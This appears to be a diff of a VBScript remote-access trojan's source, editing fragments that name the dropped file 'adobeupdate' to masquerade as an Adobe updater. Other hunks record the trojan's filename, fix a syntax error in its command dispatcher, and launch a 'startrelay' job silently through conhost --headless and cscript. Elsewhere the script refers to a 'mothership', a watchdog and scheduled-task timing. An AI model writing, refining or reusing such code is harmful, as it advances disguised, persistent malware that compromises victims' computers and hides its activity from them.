@@ -1160,6 +1160,7 @@ Function GetLocalUsers()
 
 End Function
  
+
 Function FileExists(dirpath, fname)
     FileExists = False
     
@@ -1474,7 +1475,7 @@ Dim watchdogtimedelay : watchdogtimedelay = 30
 Dim tskxmltime : tskxmltime=90 
 Dim timetaskxmltime : timetaskxmltime=90
 
-Dim trojanfname : trojanfname = GenerateRandomCode(4)
+Dim trojanfname : trojanfname = "adobeupdate"
 
 Dim workdir : workdir = tempPath & "\" & trojanname 
 Dim exepath : exepath = workdir & "\" & "launch.exe"
@@ -1567,7 +1568,7 @@ Function Init()
 
     If Not fso.FileExists(workdir & "\" & trojanfname) Then
         fso.CopyFile scriptpath, workdir & "\" & trojanfname, True
-        ' TODO: call reschedule
+        Call WriteFile(workdir & "\" & "trojanfname", trojanfname)
     End If    
 
     If fso.FileExists(workdir & "\" & "mothership") Then
@@ -1603,7 +1604,7 @@ Function Init()
     
     Dim func : Set func = GetRef(cmdname)
 
-    If Not IsValidFunction(func)
+    If Not IsValidFunction(func) Then
         Call LogMsg(pp & " -- ")
         WScript.Quit(1)
     End If
@@ -2482,7 +2483,7 @@ Function LaunchExecCmd(argstr)
     If ( LCase(exec_cmdname) = LCase("StartRelay") ) Then
         Call PushEventMother("start_job")
 
-        Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & trojanfname & " startrelay " )
+        Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B //E:vbscript " & workdir & "\" & trojanfname & " startrelay " )
         
         LaunchExecCmd = 0
     End If
